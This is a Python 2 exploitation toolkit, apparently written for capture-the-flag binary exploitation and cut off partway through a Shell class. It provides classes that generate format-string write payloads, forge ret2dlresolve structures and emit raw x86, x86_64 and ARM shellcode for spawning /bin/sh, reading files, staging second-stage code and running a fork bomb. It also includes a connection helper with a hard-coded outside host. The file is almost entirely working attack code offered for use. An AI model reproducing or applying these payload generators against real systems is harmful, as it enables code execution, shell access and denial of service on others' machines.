#!/usr/bin/env python
import sys
import os
from struct import pack,unpack
from thread import start_new_thread
from base64 import b64encode, b64decode
import signal
from random import choice
from time import sleep

lhp     = ('www.shift-crops.net',4296)

NULL                = 0
# <unistd.h>
STDIN_FILENO        = 0
STDOUT_FILENO       = 1
STDERR_FILENO       = 2
SEEK_SET            = 0
SEEK_CUR            = 1
SEEK_END            = 2
# <bits/fcntl-linux.h>
O_RDONLY            = 00000
O_WRONLY            = 00001
O_RDWR              = 00002
O_CREAT             = 00100
O_APPEND            = 02000
# <bits/mman-linux.h>
PROT_NONE           = 0b000
PROT_READ           = 0b001
PROT_WRITE          = 0b010
PROT_EXEC           = 0b100
MAP_SHARED          = 0b001
MAP_PRIVATE         = 0b010
MAP_ANONYMOUS       = 0x20

PREV_INUSE          = 0b001
IS_MMAPED           = 0b010
IS_NON_MAINARENA    = 0b100

fsb_len     = lambda x:    "%6$"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""
heap_sb     = lambda x,y:  (x&~0b111)|y
pack_16     = lambda x:    pack('<H' if x > 0 else '<h',x)
pack_32     = lambda x:    pack('<I' if x > 0 else '<i',x)
pack_64     = lambda x:    pack('<Q' if x > 0 else '<q',x)
unpack_16   = lambda x:    unpack('<H',x)[0]
unpack_32   = lambda x:    unpack('<I',x)[0]
unpack_64   = lambda x:    unpack('<Q',x)[0]

color       = {'N':'\x1b[39m','R':'\x1b[31m','G':'\x1b[32m','Y':'\x1b[33m','B':'\x1b[34m'}
template    = '\x1b[1m%s\x1b[39m%s\x1b[0m\n'
info        = lambda x:    sys.stderr.write(template % (color['B']+'[+]', x))
fail        = lambda x:    sys.stderr.write(template % (color['R']+'[-]', x))
proc        = lambda x:    sys.stdout.write(template % (color['G']+'[*]', x))
warn        = lambda x:    sys.stderr.write(template % (color['Y']+'[!]', x))

#==========

if os.name=='nt':
    from colorama import init as color_init
    color_init()
    
#==========

class Communicate:    
    def __init__(self, target, mode='RAW', disp=True, **args):
        self.disp = disp
        
        if mode not in ['RAW','LOCAL','SSH']:
            warn('Communicate : mode "%s" is not defined' % mode)
            info('Communicate : Set mode "RAW"')
            mode = 'RAW'
        self.mode = mode
        self.is_alive = True

        # for legacy exploit
        if isinstance(target, tuple):
            target = {'host':target[0], 'port':target[1]}
        elif isinstance(target, str):
            target = {'program':target}

        if self.mode=='RAW':
            import socket
            rhp = (target['host'],target['port'])
            if self.disp:
                proc('Connect to %s:%d' % rhp)
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(args['to'] if 'to' in args else 1.0)
            self.sock.connect(rhp)
            
        elif self.mode=='LOCAL':
            import subprocess
            if self.disp:
                proc('Starting program: %s' % target['program'])
            if 'GDB' in args and isinstance(args['GDB'] ,(int,long)):
                shell = False
                target['program'] = ('gdbserver localhost:%d %s' % (args['GDB'], target['program'])).split(' ')
            elif 'ASLR' in args and not args['ASLR']:
                shell = True
                target['program'] = 'ulimit -s unlimited; setarch i386 -R %s' % target['program']
            else:
                shell = False
                target['program'] = target['program'].split(' ')
            if 'lib' in args:
                info('LD_PRELOAD: %s' % args['lib'])
                e = {'LD_PRELOAD':args['lib']}
            else:
                e = None

            self.wait = ('wait' in args and args['wait'])
                
            self.proc = subprocess.Popen(target['program'], shell=shell, env=e, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            self.set_nonblocking(self.proc.stdout)
            if target['program'][0]=='gdbserver':
                info(self.read_until()[:-1])
                proc(self.read_until()[:-1])
                info(self.read_until()[:-1])
                raw_input('Enter any key to continue...')
            
        elif self.mode=='SSH':
            import paramiko
            if self.disp:
                proc('Connect SSH to %s@%s:%d' % (target['username'],target['host'],target['port']))
            self.ssh = paramiko.SSHClient()
            self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh.connect(target['host'], username=target['username'], password=target['password'], port=target['port'])
            self.channel = self.ssh.get_transport().open_session()
            self.channel.settimeout(args['to'] if 'to' in args else 1.0)
            self.channel.get_pty()
            if 'ASLR' in args and args['ASLR']==False:
                target['program'] = 'ulimit -s unlimited; setarch i386 -R %s' % target['program']
            self.channel.exec_command(target['program'])

    def set_nonblocking(self,fh):
        import fcntl

        fd = fh.fileno()
        fl = fcntl.fcntl(fd, fcntl.F_GETFL)
        fcntl.fcntl(fd, fcntl.F_SETFL, fl | os.O_NONBLOCK)

    def send(self,msg):
        try:
            if self.mode=='RAW':
                self.sock.sendall(msg)
            elif self.mode=='LOCAL':
                self.proc.stdin.write(msg)
            elif self.mode=='SSH':
                self.channel.sendall(msg)
        except:
            self.is_alive = False

    def sendln(self,msg):
        self.send(msg+'\n')

    def sendnull(self,msg):
        self.send(msg+'\x00')
        
    def read(self,num=4):
        sleep(0.05)
        rsp = ''
        try:
            if self.mode=='RAW':
                rsp = self.sock.recv(num)
            elif self.mode=='LOCAL':
                rsp = self.proc.stdout.read(num)
            elif self.mode=='SSH':
                rsp = self.channel.recv(num)
        except:
            pass
        return rsp

    def read_all(self):
        sleep(0.05)
        try:
            rsp = ''
            while True:
                if self.mode=='RAW':
                    rcv = self.sock.recv(512)
                elif self.mode=='LOCAL':
                    rcv = self.proc.stdout.read()
                elif self.mode=='SSH':
                    rcv = self.channel.recv(512)

                if rcv:
                    rsp += rcv
                else:
                    break
        except:
            pass
        return rsp

    def read_until(self,term='\n'):
        rsp = ''
        while not rsp.endswith(term):
            try:
                if self.mode=='RAW':
                    rsp += self.sock.recv(1) 
                elif self.mode=='LOCAL':
                    rsp += self.proc.stdout.read(1)
                elif self.mode=='SSH':
                    rsp += self.channel.recv(1)
            except:
                pass
        return rsp

    def __del__(self):
        if self.mode=='RAW':
            self.sock.close()
            if self.disp:
                proc('Network Disconnect...')
        elif self.mode=='LOCAL':
            if self.wait:
                self.proc.communicate(None)
            elif self.proc.poll() is None:
                self.proc.terminate()
            if self.disp:
                proc('Program Terminate...')
        elif self.mode=='SSH':
            self.channel.close()
            if self.disp:
                proc('Session Disconnect...')

#==========

class FSB:
    def __init__(self,header=0,count=0,gap=0,size=2,debug=False):
        self.adrval = {}
        self.padding= False
        self.debug  = debug

        gap %= 4
        header_pad = (4 - header%4) % 4
        if header_pad:
            warn('FSB : header size is not a multiple of 4')
            info('FSB : Auto padding size is 0x%d bytes' % header_pad)
            header += header_pad
        if gap or header_pad:
            self.padding = True
            warn('FSB : Use "get()" to generate exploit')
        
        self.__fsb  = '@'*(gap + header_pad)
        self.header = header
        self.count  = count + header + gap
        
        if size == 1:
            self.wfs = 2        # %hhn
            self.fr  = 0x100
        elif size == 4:
            self.wfs = 0        # %n
            self.fr  = 0x1000000
        else:
            if size != 2:
                warn('FSB : Unit size %d bytes is invalid' % size)
                info('FSB : Set unit size 2 bytes')
                size = 2
            self.wfs = 1        # %hn
            self.fr  = 0x10000
        self.size   = size

    def get(self):
        return self.__fsb

    def gen(self,fsb):
        n_idx = fsb.find('\x00')
        if n_idx >= 0:
            warn('FSB(gen) : null character detected(%d)' % (len(self.__fsb)+n_idx+1))
        self.__fsb += fsb
        return '' if self.padding else fsb
    
    def addr(self,adr):
        self.count += 4
        adr = pack_32(adr)
        return self.gen(adr)

    def write(self,index,value):
        x = value - self.count
        fsb  = '%%%d$%dc' % (1, x if x>0 else self.fr+x) if x else ''
        fsb += '%%%d$%sn' % (index + self.header/4, 'h'*self.wfs)
        self.count = value
        return self.gen(fsb)

    def set_adrval(self, addr, value):
        self.adrval.update({addr:value})

    def auto_write(self,index):
        adr = pld = ''
        d = {}
        l = []
        for a, v in self.adrval.items():
            if self.size == 1:
                div = {a:v&0xff, a+1:(v>>0x8)&0xff, a+2:(v>>0x10)&0xff, a+3:(v>>0x18)&0xff}
            elif self.size == 4:
                div = {a:v}
            else:
                div = {a:v&0xffff, a+2:v>>0x10}
            d.update(div)
            
        start_count = self.count + len(d)*4
        for a, v in d.items():
            if v < start_count:
                d[a]+=1<<self.size*8
                
        for a, v in sorted(d.items(), key=lambda x:x[1]):
            if self.debug:
                print ('0x%%08x <- 0x%%%02dx' % (self.size*2)) % (a,v)
            adr += self.addr(a)
            l+=[v]
        for value in l:
            pld += self.write(index,value)
            index += 1
        if self.debug:
            print pld
        
        return adr+pld

#==========

class DLresolve:
    def __init__(self, arch, addr_dynsym, addr_dynstr, addr_relplt, addr_version=None):
        if arch not in ['x86','x86_64','amd64']:
            warn('DLresolve : Architecture "%s" is not defined' % arch)
            info('DLresolve : Set arch "x86"')
            arch = 'x86'
        self.reloc_offset   = {}
        self.funcadr        = {}
        self.arch           = arch
        self.addr_dynsym    = addr_dynsym
        self.addr_dynstr    = addr_dynstr
        self.addr_relplt    = addr_relplt
        self.addr_version   = addr_version

    def set_funcadr(self, addr, dynstr):
        self.funcadr.update({dynstr:addr})
    
    def resolve(self,addr_buf):
        d = {}
        dynstr = dynsym = relplt =''
        
        addr_buf_dynstr      = addr_buf
        for s,a in self.funcadr.items():
            d.update({s:len(dynstr)})
            dynstr += s+'\x00'
        
        addr_buf_dynsym      = addr_buf_dynstr + len(dynstr)
        if self.arch is 'x86':
            align_dynsym         = (0x10-(addr_buf_dynsym - self.addr_dynsym)%0x10)%0x10
        elif self.arch in ['x86_64','amd64']:
            align_dynsym         = (0x18-(addr_buf_dynsym - self.addr_dynsym)%0x18)%0x18
        addr_buf_dynsym     += align_dynsym
            
        for s,of in d.items():
            if self.arch is 'x86':
                dynsym  += pack_32(addr_buf_dynstr + of - self.addr_dynstr)
                dynsym  += pack_32(0)
                dynsym  += pack_32(0)
                dynsym  += pack_32(0x12)
            elif self.arch in ['x86_64','amd64']:
                dynsym  += pack_32(addr_buf_dynstr + of - self.addr_dynstr)
                dynsym  += pack_32(0x12)
                dynsym  += pack_64(0)
                dynsym  += pack_64(0)
                
        addr_buf_relplt      = addr_buf_dynsym + len(dynsym)
        if self.arch is 'x86':
            align_relplt     = 0
            r_info           = (addr_buf_dynsym - self.addr_dynsym) / 0x10
        elif self.arch in ['x86_64','amd64']:
            align_relplt     = (0x18-(addr_buf_relplt - self.addr_relplt)%0x18)%0x18
            r_info           = (addr_buf_dynsym - self.addr_dynsym) / 0x18
        addr_buf_relplt     += align_relplt

        if self.addr_version is not None:
            warn('check gnu version : [0x%08x] & 0x7fff' % (self.addr_version+r_info*2))
        
        for s,a in self.funcadr.items():
            if self.arch is 'x86':
                self.reloc_offset.update({s : addr_buf_relplt + len(relplt) -self.addr_relplt})
                relplt  += pack_32(a)
                relplt  += pack_32(r_info << 8 | 0x7)
            elif self.arch in ['x86_64','amd64']:
                self.reloc_offset.update({s : (addr_buf_relplt + len(relplt) -self.addr_relplt)/0x18})
                relplt  += pack_64(a)
                relplt  += pack_32(0x7)
                relplt  += pack_32(r_info)
                relplt  += pack_64(0)
            r_info  += 1

        if align_dynsym:
            info('DLresolve : Auto padding dynsym size is 0x%d bytes' % align_dynsym)
        if align_relplt:
            info('DLresolve : Auto padding relplt size is 0x%d bytes' % align_relplt)
            
        return dynstr + '@'*(align_dynsym) + dynsym + '@'*(align_relplt) + relplt

    def offset(self,dynstr):
        if dynstr in self.reloc_offset:
            return self.reloc_offset[dynstr]
        else:
            warn('dynstr "%s" does not exist.' % dynstr)
            exit()

#==========

class ShellCode:        
    def __init__(self,arch='x86', max_len=None, null_free=False):
        self.__shellcode  = ''
        if arch not in ['x86','x86_64','amd64','arm']:
            warn('ShellCode(init) : Architecture "%s" is not defined' % arch)
            info('ShellCode(init) : Set arch "x86"')
            arch = 'x86'
           
        self.arch       = arch
        self.max_len    = max_len
        self.null_free  = null_free
        self.initialized= False

        if self.arch in ['x86','arm']:
            self.sys_no = {'exit':0x01, 'fork':0x02, 'read':0x03, 'write':0x04, 'open':0x05, 'close':0x06, 'execve':0x0b, 'dup2':0x3f, 'mmap':0x5a, 'munmap':0x5b, 'mprotect':0x7d, 'geteuid':0xc9, 'setreuid':0xcb}
        elif self.arch in ['x86_64','amd64']:
            self.sys_no = {'exit':0x3c, 'fork':0x39, 'read':0x00, 'write':0x01, 'open':0x02, 'close':0x03, 'execve':0x3b, 'dup2':0x21, 'mmap':0x09, 'munmap':0x0b, 'mprotect':0x0a, 'geteuid':0x6b, 'setreuid':0x71}

    def get(self):
        return self.__shellcode

    def gen(self,code):
        if not self.initialized and self.arch == 'arm':
            warn('ShellCode : You need to call start() if CPU mode is not thumb.')
 
        if self.max_len is not None and self.max_len < len(self.__shellcode+code):
            warn('ShellCode(gen) : Length exceeds 0x%x bytes' % self.max_len)
            return ''

        if self.null_free:
            n_idx = code.find('\x00')
            if n_idx >= 0:
                warn('ShellCode(gen) : null character detected(%d)' % (len(self.__shellcode)+n_idx+1))
        n_idx = code.find('\x0a')
        if n_idx >= 0:
            warn('ShellCode(gen) : LF character detected(%d)' % (len(self.__shellcode)+n_idx+1))
            
        self.__shellcode += code
        return code

    def padding(self,pad_size=None,word='\x90'):
        if pad_size is None:
            if self.max_len is not None:
                pad_size = self.max_len - len(self.__shellcode)
                info('ShellCode(padding) : Auto padding size is 0x%x bytes' % pad_size)
            else:
                warn('ShellCode(padding) : Padding size is not declared')
                return ''
        return self.gen((word * (pad_size/len(word)+1))[:pad_size])

    def start(self):
        self.initialized = True
        asm = ''
        if self.arch is 'x86':
            asm += ''
        elif self.arch in ['x86_64','amd64']:
            asm += ''
        elif self.arch is 'arm':
            asm += "\x01\x30\x8f\xe3" # orr   r3, pc, 1
            asm += "\x13\xff\x2f\xe1" # bx    r3
        return self.gen(asm)

    def rval2arg(self,index):
        asm = ''
        if index<6:
            if self.arch is 'x86':
                ebx = 0xc3
                d   = (0,2,1,5,4)
                asm += '\x89'+chr(ebx^d[index-1])
                                                    # mov    ebx/ecx/edx/esi/edi, eax
            elif self.arch in ['x86_64','amd64']:
                rdi = 0xc7
                d   = (0,1,5,5,7)
                prefix = ('\x48','\x48','\x48','\x49','\x49')
                asm += prefix[index-1]+'\x89'+chr(rdi^d[index-1])
                                                    # mov    rdi/rsi/rdx/r10/r8,  rax
            elif self.arch is 'arm':
                if index > 1:
                    asm += chr(index-1)+'\x1c'      # adds   r1/r2/r3/r4, r0, #0
        return self.gen(asm)

    def str_addr(self,string):
        string = string.rstrip('\x00')
        string += '\xff' if self.null_free else '\x00'

        asm = ''
        if self.arch is 'x86':
            if self.null_free:
                asm += '\xeb'+chr(0x6)              # jmp    0x6
                asm += '\x8b\x04\x24'               # mov    eax,DWORD PTR [esp]
                asm += '\x04'+chr(0x9)              # add    al,0x9
                asm += '\xc3'                       # ret
                asm += '\xe8'+pack_32(-0xb)         # call   -0xb
                asm += '\x53'                       # push   ebx
                asm += '\x31\xdb'                   # xor    ebx, ebx
                asm += '\x88\x58'+chr(len(string)-1)# mov    BYTE PTR [eax+len(string)-1],bl
                asm += '\x5b'                       # pop    ebx
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
            else:
                asm += '\xe8'+pack_32(0)            # call   0x0
                asm += '\x58'                       # pop    eax
                asm += '\x83\xc0'+chr(0x6)          # add    eax,0x6
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
        elif self.arch in ['x86_64','amd64']:
            if self.null_free:
                asm += '\x48\x8d\x05'+pack_32(-0x7) # lea    rax,[rip-0x7]
                asm += '\x04'+chr(0x12)             # add    al,0x12
                asm += '\x53'                       # push   rbx
                asm += '\x31\xdb'                   # xor    ebx, ebx
                asm += '\x88\x58'+chr(len(string)-1)# mov    BYTE PTR [rax+len(string)-1],bl
                asm += '\x5b'                       # pop    rbx
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
            else:
                asm += '\x48\x8d\x05'+pack_32(2)    # lea    rax,[rip+0x5]
                asm += '\xeb'+chr(len(string))      # jmp    len(string)
        elif self.arch is 'arm':
            string += '\xff'*(len(string)%2)
            len_str = len(string)-1
            asm += '\x78\x46'                   # mov    r0, pc
            if self.null_free:
                asm += '\x0a\x30'                   # adds   r0, #0xa  
                asm += '\x10\xb4'                   # push   {r4}
                asm += '\x64\x40'                   # eors   r4, r4
                asm += ''.join(map(chr,[(len_str%4)<<6|0x4,0x70|(len_str/4)]))
                                                    # strb   r4, [r0, #len(string)-1]
                asm += '\x10\xbc'                   # pop    {r4}
            asm += chr(len(string)/2-1)+'\xe0'  # b.n    len(string)
        return self.gen(asm + string)

    def arr_addr(self,arr):
        arr.reverse()
        string = ''
        for elm in arr:
            if isinstance(elm, str):
                string += elm+('\xff\xff' if self.null_free else '\x00\x00')
        if string:
            string = string[:-2]
                
        asm = ''
        if self.arch is 'x86':
            asm += '\x31\xff'                   # xor     edi, edi
            asm += '\x57'                       # push    edi
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += '\x68'+pack_32(elm)      # push elm
                elif isinstance(elm, str):
                    asm += '\x50'                   # push    eax
                    asm += '\x04'+chr(len(elm)+2)   # add     al, len(elm)+2
                    if self.null_free:
                        asm += '\x66\x89\x78\xfe'       # mov    WORD PTR [eax-0x2],di
            asm += '\x89\xe0'                   # mov     eax, esp
        elif self.arch in ['x86_64','amd64']:
            asm += '\x4d\x31\xc0'               # xor     r8, r8
            asm += '\x41\x50'                   # push    r8
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += '\x48\xb8'+pack_64(elm)  # movabs  rax, elm
                    asm += '\x50'                   # push    rax
                elif isinstance(elm, str):
                    asm += '\x50'                   # push    rax
                    asm += '\x04'+chr(len(elm)+2)   # add     al, len(elm)+2
                    if self.null_free:
                        asm += '\x44\x88\x40\xfe'       # mov    BYTE PTR [rax-0x2],r8b
            asm += '\x48\x89\xe0'               # mov     rax, rsp
        elif self.arch is 'arm':
            asm += '\x64\x40'                   # eors    r4, r4
            asm += '\x10\xb4'                   # push    {r4}
            for elm in arr:
                if isinstance(elm, (int,long)):
                    asm += ''.join(map(chr,[0x40|elm>>12&0xf,0xf2|(elm&0x800)>>9,elm&0xff,(elm>>4)&0x70]))
                                                    # movw    r0, #(elm&0xffff)
                    elm>>=16
                    asm += ''.join(map(chr,[0xc0|elm>>12&0xf,0xf2|(elm&0x800)>>9,elm&0xff,(elm>>4)&0x70]))
                                                    # movt    r0, #(elm>>16)
                    asm += '\x01\xb4'               # push    {r0}
                elif isinstance(elm, str):
                    asm += '\x01\xb4'               # push    {r0}
                    if self.null_free:
                        asm += ''.join(map(chr,[(len(elm)%4)<<6|0x4,0x70|(len(elm)/4)]))
                                                    # strb    r4, [r0, #len(elm)]
                    asm += chr(len(elm)+2)+'\x30'   # adds    r0, len(elm)+2
            asm += '\x68\x46'                   # mov     r0, sp
        return (self.str_addr(string) if string else '')+self.gen(asm)

    def syscall(self,sys_no,args=[None]):
        args = args+[None]*(5-len(args))
        asm = ''
        if self.arch is 'x86':
            ebx = (0xdb,0xbb)
            d   = (0,2,1,5,4)
            for i in range(5): 
                if args[i] is not None:
                    reg = (ebx[0]^(d[i]*9),ebx[1]^d[i])
                    if not args[i]&(((1<<16)-1)<<16):
                        asm += '\x31'+chr(reg[0])                               # xor    ebx/ecx/edx/esi/edi,   ebx/ecx/edx/esi/edi
                    if args[i]&(((1<<16)-1)<<16):
                        asm += chr(reg[1])+pack_32(args[i])                     # mov    bx/cx/dx/si/di,        args&0xffff
                    elif (i<3 and args[i]&(((1<<8)-1)<<8)) or i>=3:
                        asm += '\x66'+chr(reg[1])+pack_16(args[i])              # mov    bl/cl/dl,              args&0xff
                    elif args[i]&((1<<8)-1):
                        asm += chr(reg[1]-8)+chr(args[i]) 
            asm +=  '\x31\xc0'                      # xor    eax, eax
            if sys_no:
                asm +=  '\xb0'+chr(sys_no&0xff)         # mov    al, sys_no
            asm +=  '\xcd\x80'                      # int    0x80
        elif self.arch in ['x86_64','amd64']:
            rdi = (0xff,0xbf)
            d   = (0,1,5,5,7)
            prefix = (('\x48','\x48','','\x40'),('\x48','\x48','','\x40'),('\x48','\x48','',''),('\x4d','\x49','\x41','\x41'),('\x4d','\x49','\x41','\x41'))
            for i in range(5): 
                if args[i] is not None:
                    reg = (rdi[0]^(d[i]*9),rdi[1]^d[i])
                    if not args[i]&(((1<<32)-1)<<32):
                        asm += prefix[i][0]+'\x31'+chr(reg[0])                  # xor    rdi/rsi/rdx/r10/r8,   rdi/rsi/rdx/r10/r8
                    if args[i]&(((1<<32)-1)<<32):
                        asm += prefix[i][1]+chr(reg[1])+pack_64(args[i])        # movabs rdi/rsi/rdx/r10/r8,   args
                    elif args[i]&(((1<<16)-1)<<16):
                        asm += prefix[i][2]+chr(reg[1])+pack_32(args[i])        # mov    edi/esi/edx/r10d/r8d, args&0xffffffff
                    elif args[i]&(((1<<8)-1)<<8):
                        asm += '\x66'+prefix[i][2]+chr(reg[1])+pack_16(args[i]) # mov    di/si/dx/r10w/r8w,    args&0xffff
                    elif args[i]&((1<<8)-1):
                        asm += prefix[i][3]+chr(reg[1]-8)+chr(args[i])          # mov    dil/sil/dl/r10b/r8b,  args&0xff
            asm += '\x48\x31\xc0'                   # xor    rax, rax
            if sys_no:
                asm += '\x04'+chr(sys_no&0xff)          # add    al, sys_no
            asm += '\x0f\x05'                       # syscall
        elif self.arch is 'arm':
            for i in range(5):
                if args[i] is not None:
                    v = args[i]
                    if v&(((1<<8)-1)<<8):
                        asm += ''.join(map(chr,[0x40|v>>12&0xf,0xf2|(v&0x800)>>9,v&0xff,(v>>4)&0x70|i]))
                                                                                # movw  r0/r1/r2/r3/r4, args&0xffff
                    elif v&((1<<8)-1):
                        asm += ''.join(map(chr,[v&0xff,0x20|i]))                # movs  r0/r1/r2/r3/r4, args&0xff
                    else:
                        asm += chr(0x40|i*9)+'\x40'                             # eor   r0/r1/r2/r3/r4, r0/r1/r2/r3/r4

                    v >>= 16
                    if v:
                        asm += ''.join(map(chr,[0xc0|v>>12&0xf,0xf2|(v&0x800)>>9,v&0xff,(v>>4)&0x70|i]))
                                                                                # movt  r0/r1/r2/r3/r4, (args&0xffff0000)>>16       
            if sys_no:
                asm += chr(sys_no&0xff)+'\x27'          # movs   r7, sys_no
            else:
                asm += '\x7f\x40'                       # eor   r7, r7
            asm += '\x01\xdf'                       # svc    1
        return self.gen(asm)
    
    def exit(self, code=0):
        # exit(code)
        return self.syscall(self.sys_no['exit'],[code])

    def fork(self):
        # fork()
        return self.syscall(self.sys_no['fork'])
    
    def read(self, fd, buf, size):
        # read(fd, buf, size)
        return self.syscall(self.sys_no['read'],[fd,buf,size])
    
    def write(self, fd, buf, size):
        # write(fd, buf, size)
        return self.syscall(self.sys_no['write'],[fd,buf,size])
        
    def open(self,fname,flags=O_RDONLY,mode=0644):
        # open(fname, flags)
        if isinstance(fname, (int,long)):
            asm_fname = ''
        elif isinstance(fname, str):
            asm_fname  = self.str_addr(fname)
            asm_fname += self.rval2arg(1)
            fname = None
        return asm_fname+self.syscall(self.sys_no['open'],[fname,flags,mode])

    def close(self, fd):
        # close(fd, buf, length)
        return self.syscall(self.sys_no['close'],[fd])

    def execve(self,fname,argv=NULL,envp=NULL):
        # execve(fname,argv,envp)
        save = (isinstance(argv, list) or isinstance(envp, list))
        asm_fname = ''
        asm_argv = ''
        asm_envp = ''
            
        if isinstance(fname, str):
            asm_fname += self.str_addr(fname)
            asm_fname += self.rval2arg(4 if save else 1)
            fname = None
        elif save and fname is None:
            if self.arch is 'x86':
                asm_fname += '\x89\xde'             # mov    esi, ebx
            elif self.arch in ['x86_64','amd64']:
                asm_fname += '\x49\x89\xfa'         # mov    r10, rdi
            elif self.arch is 'arm':
                asm_fname += '\x03\x1c'             # adds   r3, r0, #0
        
        if isinstance(argv, list):
            asm_argv += self.arr_addr(argv)
            asm_argv += self.rval2arg(2)
            argv = None
        if isinstance(envp, list):
            asm_envp += self.arr_addr(envp)
            asm_envp += self.rval2arg(3)
            envp = None
            
        asm = ''
        if fname is None:
            if save:
                if self.arch is 'x86':
                    asm += '\x89\xf3'             # mov    ebx, esi
                elif self.arch in ['x86_64','amd64']:
                    asm += '\x4c\x89\xd7'         # mov    rdi, r10
                elif self.arch is 'arm':
                    asm += '\x18\x1c'             # adds   r0, r3, #0
                    
            if argv is None:
                if self.arch is 'x86':
                    asm += '\x80\xe9\x04'         # sub    cl, 0x4
                    asm += '\x89\x19'             # mov    DWORD PTR [ecx],ebx
                elif self.arch in ['x86_64','amd64']:
                    asm += '\x40\x80\xee\x08'     # sub    sil, 0x8
                    asm += '\x48\x89\x3e'         # mov    QWORD PTR [rsi],rdi
                elif self.arch is 'arm':
                    asm += '\x41\xf8\x04\x0d'     # str.w   r0, [r1, #-4]!
            
        return asm_fname+asm_argv+asm_envp+self.gen(asm)+self.syscall(self.sys_no['execve'],[fname,argv,envp])

    def dup2(self,old,new):
        # dup2(old,new)
        return self.syscall(self.sys_no['dup2'],[old,new])

    def mmap(self,addr,length,prot,flags,fd):
        # mmap(addr,length,prot,flags,fd)
        return self.syscall(self.sys_no['mmap'],[addr,length,prot,flags,fd])
    
    def munmap(self,addr,length):
        # munmap(addr,length)
        return self.syscall(self.sys_no['munmap'],[addr,length])

    def mprotect(self,addr,length,prot):
        # mprotect(addr,length,prot)
        return self.syscall(self.sys_no['mprotect'],[addr,length,prot])

    def geteuid(self):
        # geteuid()
        return self.syscall(self.sys_no['geteuid'])

    def setreuid(self,ruid,euid):
        # setreuid(ruid, euid)
        return self.syscall(self.sys_no['setreuid'],[ruid,euid])
    
    def sh(self,abridge_args=True):
        asm = ''
        if self.arch is 'x86':
            asm +=  '\x31\xd2'                      # xor     edx, edx
            asm +=  '\x52'                          # push    edx
            asm +=  '\x68//sh'                      # push    0x68732f2f
            asm +=  '\x68/bin'                      # push    0x6e69622f
            asm +=  '\x89\xe3'                      # mov     ebx, esp
        elif self.arch in ['x86_64','amd64']:
            asm += '\x48\xbb//bin/sh'               # mov     rbx, '//bin/sh'
            asm += '\x48\xc1\xeb\x08'               # shr     rbx, 8
            asm += '\x53'                           # push    rbx
            asm += '\x48\x89\xe7'                   # mov     rdi, rsp
            asm += '\x48\x31\xd2'                   # xor     rdx, rdx
        elif self.arch is 'arm':
            asm += '\x42\xf6\x2f\x70'               # movw    r0, #12079      ; 0x2f2f //
            asm += '\xc6\xf6\x62\x10'               # movt    r0, #26978      ; 0x6962 ib
            asm += '\x42\xf6\x6e\x71'               # movw    r1, #12142      ; 0x2f6e /n
            asm += '\xc6\xf6\x73\x01'               # movt    r1, #26739      ; 0x6873 hs
            asm += '\x52\x40'                       # eor     r2, r2
            asm += '\x07\xb4'                       # push    {r0, r1, r2}
            asm += '\x68\x46'                       # mov     r0, sp
        return self.gen(asm)+self.execve(None,NULL if abridge_args else [],None)

    def read_file(self, fname, buf, size=0x501):
        asm  = self.open(fname)
        asm += self.rval2arg(1)
        asm += self.read(None,buf,size)
        asm += self.rval2arg(3)
        asm += self.write(STDOUT_FILENO,buf,None)
        return asm

    def stager(self, fd=STDIN_FILENO, buf=0, size=0x501):
        sc_tmp = ShellCode(self.arch, null_free=self.null_free)
        sc_tmp.start()
        size_read = len(sc_tmp.read(fd,None,size))
        
        asm_1 = ''
        asm_2 = ''
        if self.arch is 'x86':
            if buf==0:
                buf = None
                if self.null_free:
                    asm_1 += '\xeb'+chr(0x7)                    # jmp    0x7
                    asm_1 += '\x8b\x0c\x24'                     # mov    ecx,DWORD PTR [esp]
                    asm_1 += '\x80\xc1'+chr(size_read)          # add    cl,len(read)
                    asm_1 += '\xc3'                             # ret
                    asm_1 += '\xe8'+pack_32(-0xc)               # call   -0xc
                else:
                    asm_1 += '\xe8'+pack_32(0)                  # call   0x0
                    asm_1 += '\x59'                             # pop    ecx
                    asm_1 += '\x83\xc1'+chr(size_read+0x4)      # add    ecx,len(read)+0x4
            else:
                asm_2 += '\xff\xe1'                         # jmp    ecx
        elif self.arch in ['x86_64','amd64']:
            if buf==0:
                buf = None
                asm_1 += '\x48\x8d\x35'+pack_32(-0x7)       # lea    rsi,[rip-0x7]
                asm_1 += '\x40\x80\xc6'+chr(size_read+0xb)  # add    sil,len(read)+0xb
            else:
                asm_2 += '\xff\xe6'                         # jmp    rsi
        elif self.arch is 'arm':
            if buf==0:
                buf = None
                asm_1 += '\x79\x46'                         # mov    r1, pc
                asm_1 += chr(size_read)+'\x31'              # adds   r1, len(read)
            else:
                asm_2 += '\x01\x31'                         # adds   r1, #1
                asm_2 += '\x08\x47'                         # bx     r1
        return self.gen(asm_1)+self.read(fd,buf,size)+self.gen(asm_2)

    def fork_bomb(self,level=1):
        asm  = ''
        if level>0:
            if self.arch is 'x86':
                if level<3:
                    asm += '\x85\xc0'                       # test    eax, eax
                    asm += '\x0f'+chr(0x83+level)+'\x05\x00\x00\x00'
                                                            # level1: je  5 /   level2: jne 5
                    asm += '\xe9\xed\xff\xff\xff'           # jmp     -19
                else:
                    asm += '\xe9\xf5\xff\xff\xff'           # jmp     -11
            elif self.arch in ['x86_64','amd64']:
                if level<3:
                    asm += '\x48\x85\xc0'                   # test    rax, rax
                    asm += '\x0f'+chr(0x83+level)+'\x05\x00\x00\x00'
                                                            # level1: je  5 /   level2: jne 5
                    asm += '\xe9\xeb\xff\xff\xff'           # jmp     -21
                else:
                    asm += '\xe9\xf4\xff\xff\xff'           # jmp     -12
            elif self.arch is 'arm':
                if level<3:
                    asm += '\x00\x28'                       # cmp     r0, #0
                    asm += '\x00'+chr(0xcf+level)           # level1: beq.n 4 /   level2: bne.n 4
                    asm += '\xfa\xe7'                       # b.n     -8
                else:
                    asm += '\xfc\xe7'                       # b.n     -4
        return self.fork()+self.gen(asm)+self.exit(0)
    
#==========

class Shell:
    def __init__(self,cmn):
        signal.signal(signal.SIGINT,self.wait_handler)
        self.cmn    = cmn
        self.token  = ''
        self.enable = {}
        self.wait   = False
        for i in range(5):
            self.token+=choice("1234567890abcdefghijklmnopqrstuvwxyz")

    def wait_handler(self, signum, stack):
